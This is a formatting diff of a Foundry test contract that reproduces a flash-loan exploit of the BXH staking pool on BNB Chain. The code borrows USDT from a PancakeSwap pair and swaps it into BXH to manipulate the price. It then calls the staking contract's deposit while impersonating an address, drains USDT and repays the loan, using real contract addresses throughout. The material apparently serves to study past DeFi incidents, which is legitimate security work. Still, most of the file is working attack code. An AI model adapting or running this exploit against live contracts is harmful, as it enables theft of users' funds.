@@ -18,19 +18,15 @@ import {IPancakePair} from "src/interfaces/IPancakePair.sol";
 IERC20 constant BXH = IERC20(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);
 
 contract Attacker is Test {
+
     IERC20 constant vUSDT = IERC20(0x19195aC5F36F8C75Da129Afca8f92009E292B84a);
     IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    IWBNB constant wbnb =
-        IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    IPancakeRouter constant pancakeRouter =
-        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    IPancakeRouter constant bxhRouter =
-        IPancakeRouter(payable(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01));
+    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IPancakeRouter constant bxhRouter = IPancakeRouter(payable(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01));
 
-    IPancakePair constant usdtwbnbpair =
-        IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // wbnb/usdt Pair
-    IPancakePair constant bxhusdtpair =
-        IPancakePair(0x919964B7f12A742E3D33176D7aF9094EA4152e6f); // bxh/usdt Pair
+    IPancakePair constant usdtwbnbpair = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE); // wbnb/usdt Pair
+    IPancakePair constant bxhusdtpair = IPancakePair(0x919964B7f12A742E3D33176D7aF9094EA4152e6f); // bxh/usdt Pair
 
     TokenStakingPoolDelegate constant bxhtokenstaking =
         TokenStakingPoolDelegate(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663);
@@ -68,54 +64,26 @@ contract Attacker is Test {
             usdt.balanceOf(address(0x919964B7f12A742E3D33176D7aF9094EA4152e6f)),
             18
         );
-        usdtwbnbpair.swap(
-            3_178_800_000_000_000_000_000_000,
-            0,
-            address(this),
-            "0x"
-        );
+        usdtwbnbpair.swap(3_178_800_000_000_000_000_000_000, 0, address(this), "0x");
 
-        emit log_named_decimal_uint(
-            "[Over] Hacker USDT Balance is :",
-            usdt.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[Over] Hacker USDT Balance is :", usdt.balanceOf(address(this)), 18);
     }
 
-    function pancakeCall(
-        address sender,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) public {
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
         console.log("[Flashloan] received");
         //approve bxh router for usdt
-        usdt.approve(
-            0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01,
-            type(uint256).max
-        );
+        usdt.approve(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01, type(uint256).max);
 
         address[] memory path = new address[](2);
         path[0] = address(0x55d398326f99059fF775485246999027B3197955);
         path[1] = address(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);
 
         bxhRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            usdt.balanceOf(address(this)) - 805_614_870_582_412_124_618,
-            1,
-            path,
-            address(this),
-            block.timestamp
+            usdt.balanceOf(address(this)) - 805_614_870_582_412_124_618, 1, path, address(this), block.timestamp
         );
-        emit log_named_decimal_uint(
-            "[Flashloan] now Hacker BXH balance is :",
-            BXH.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[Flashloan] now Hacker BXH balance is :", BXH.balanceOf(address(this)), 18);
 
-        usdt.transfer(
-            0x27539B1DEe647b38e1B987c41C5336b1A8DcE663,
-            805_614_870_582_412_124_618
-        );
+        usdt.transfer(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, 805_614_870_582_412_124_618);
 
         emit log_named_decimal_uint(
             "[Flashloan] now bxh contract USDT balance is :",
@@ -125,74 +93,43 @@ contract Attacker is Test {
 
         vm.startPrank(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f);
         bxhtokenstaking.deposit(0, 0);
-        usdt.transfer(
-            address(this),
-            usdt.balanceOf(address(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f))
-        );
+        usdt.transfer(address(this), usdt.balanceOf(address(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f)));
         vm.stopPrank();
 
-        emit log_named_decimal_uint(
-            "[Flashloan] Hacker USDT Balance is :",
-            usdt.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[Flashloan] Hacker USDT Balance is :", usdt.balanceOf(address(this)), 18);
         emit log_named_decimal_uint(
             "[Flashloan] bxh contract USDT Balance is :",
             usdt.balanceOf(address(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663)),
             18
         );
 
-        BXH.approve(
-            0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01,
-            type(uint256).max
-        );
+        BXH.approve(0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01, type(uint256).max);
 
         address[] memory bxh_usdtpath = new address[](2);
         bxh_usdtpath[0] = address(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);
         bxh_usdtpath[1] = address(0x55d398326f99059fF775485246999027B3197955);
 
         bxhRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            BXH.balanceOf(address(this)),
-            1,
-            bxh_usdtpath,
-            address(this),
-            block.timestamp
+            BXH.balanceOf(address(this)), 1, bxh_usdtpath, address(this), block.timestamp
         );
 
-        emit log_named_decimal_uint(
-            "[Flashloan] Hacker USDT Balance is :",
-            usdt.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[Flashloan] Hacker USDT Balance is :", usdt.balanceOf(address(this)), 18);
 
         uint256 swapfee = (amount0 * 26) / 10_000;
 
-        usdt.transfer(
-            address(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE),
-            amount0 + swapfee
-        );
+        usdt.transfer(address(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE), amount0 + swapfee);
     }
 
     receive() external payable {}
+
 }
 
 interface TokenStakingPoolDelegate {
+
     event Deposit(address indexed user, uint256 indexed pid, uint256 amount);
-    event DepositDelegate(
-        address indexed user,
-        address toUser,
-        uint256 indexed pid,
-        uint256 amount
-    );
-    event EmergencyWithdraw(
-        address indexed user,
-        uint256 indexed pid,
-        uint256 amount
-    );
-    event OwnershipTransferred(
-        address indexed previousOwner,
-        address indexed newOwner
-    );
+    event DepositDelegate(address indexed user, address toUser, uint256 indexed pid, uint256 amount);
+    event EmergencyWithdraw(address indexed user, uint256 indexed pid, uint256 amount);
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
     event PoolAdded(
         uint256 _pid,
         uint256 _allocPoint,
@@ -206,17 +143,9 @@ interface TokenStakingPoolDelegate {
     );
     event PoolAllocateChanged(uint256 _pid, uint256 _allocPoint);
     event PoolBonusChanged(
-        uint256 _pid,
-        bool _enableBonus,
-        address _bonusToken,
-        address _swapPairAddress,
-        uint256 _lockSeconds
+        uint256 _pid, bool _enableBonus, address _bonusToken, address _swapPairAddress, uint256 _lockSeconds
     );
-    event PoolDepositChanged(
-        uint256 _pid,
-        uint256 _depositMin,
-        uint256 _depositMax
-    );
+    event PoolDepositChanged(uint256 _pid, uint256 _depositMin, uint256 _depositMax);
     event SetDelegate(bool, address);
     event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);
 
@@ -234,9 +163,7 @@ interface TokenStakingPoolDelegate {
 
     function adminAddress() external view returns (address);
 
-    function batchPrepareRewardTable(
-        uint256 spareCount
-    ) external returns (uint256);
+    function batchPrepareRewardTable(uint256 spareCount) external returns (uint256);
 
     function claimAllReward() external;
 
@@ -252,34 +179,19 @@ interface TokenStakingPoolDelegate {
 
     function deposit(uint256 _pid, uint256 _amount) external;
 
-    function depositByDelegate(
-        uint256 _pid,
-        address _toUser,
-        uint256 _amount
-    ) external;
+    function depositByDelegate(uint256 _pid, address _toUser, uint256 _amount) external;
 
     function emergencyWithdraw(uint256 _pid) external;
 
-    function getITokenBlockRewardV(
-        uint256 _lastRewardBlock
-    ) external view returns (uint256);
+    function getITokenBlockRewardV(uint256 _lastRewardBlock) external view returns (uint256);
 
-    function getITokenBlockRewardV(
-        uint256 _lastRewardBlock,
-        uint256 blocknumber
-    ) external view returns (uint256);
+    function getITokenBlockRewardV(uint256 _lastRewardBlock, uint256 blocknumber) external view returns (uint256);
 
-    function getITokenBonusAmount(
-        uint256 _pid,
-        uint256 _amountInToken
-    ) external view returns (uint256);
+    function getITokenBonusAmount(uint256 _pid, uint256 _amountInToken) external view returns (uint256);
 
     function iToken() external view returns (address);
 
-    function lockedToken(
-        uint256 _pid,
-        address _user
-    ) external view returns (uint256);
+    function lockedToken(uint256 _pid, address _user) external view returns (uint256);
 
     function massUpdatePools() external;
 
@@ -289,25 +201,15 @@ interface TokenStakingPoolDelegate {
 
     function paused() external view returns (bool);
 
-    function pending(
-        uint256 _pid,
-        address _user
-    ) external view returns (uint256, uint256);
+    function pending(uint256 _pid, address _user) external view returns (uint256, uint256);
 
-    function pendingAllReward(
-        address _user
-    ) external view returns (uint256, uint256);
+    function pendingAllReward(address _user) external view returns (uint256, uint256);
 
-    function pendingBylpToken(
-        address _lpToken,
-        address _user
-    ) external view returns (uint256, uint256);
+    function pendingBylpToken(address _lpToken, address _user) external view returns (uint256, uint256);
 
     function phase(uint256 blockNumber) external view returns (uint256);
 
-    function poolInfo(
-        uint256
-    )
+    function poolInfo(uint256)
         external
         view
         returns (
@@ -330,9 +232,7 @@ interface TokenStakingPoolDelegate {
 
     function rewardV(uint256 blockNumber) external view returns (uint256);
 
-    function safeGetITokenBlockReward(
-        uint256 _lastRewardBlock
-    ) external returns (uint256);
+    function safeGetITokenBlockReward(uint256 _lastRewardBlock) external returns (uint256);
 
     function set(uint256 _pid, uint256 _allocPoint, bool _withUpdate) external;
 
@@ -354,11 +254,7 @@ interface TokenStakingPoolDelegate {
 
     function setPause(bool _paused) external;
 
-    function setPoolDepositLimited(
-        uint256 _pid,
-        uint256 _depositMin,
-        uint256 _depositMax
-    ) external;
+    function setPoolDepositLimited(uint256 _pid, uint256 _depositMin, uint256 _depositMax) external;
 
     function setTokenPerBlock(uint256 _newPerBlock) external;
 
@@ -372,24 +268,12 @@ interface TokenStakingPoolDelegate {
 
     function updatePool(uint256 _pid) external;
 
-    function userDepositInfo(
-        uint256,
-        address,
-        uint256
-    ) external view returns (uint256 orderTime, uint256 amount);
+    function userDepositInfo(uint256, address, uint256) external view returns (uint256 orderTime, uint256 amount);
 
-    function userInfo(
-        uint256,
-        address
-    )
+    function userInfo(uint256, address)
         external
         view
-        returns (
-            uint256 amount,
-            uint256 rewardDebt,
-            uint256 rewardReceived,
-            uint256 lastReceived
-        );
+        returns (uint256 amount, uint256 rewardDebt, uint256 rewardReceived, uint256 lastReceived);
 
     function withdraw(uint256 _pid, uint256 _amount) external returns (uint256);
 
@@ -398,4 +282,5 @@ interface TokenStakingPoolDelegate {
     function withdrawEmergency(address tokenaddress, address to) external;
 
     function withdrawEmergencyNative(address to, uint256 amount) external;
+
 }
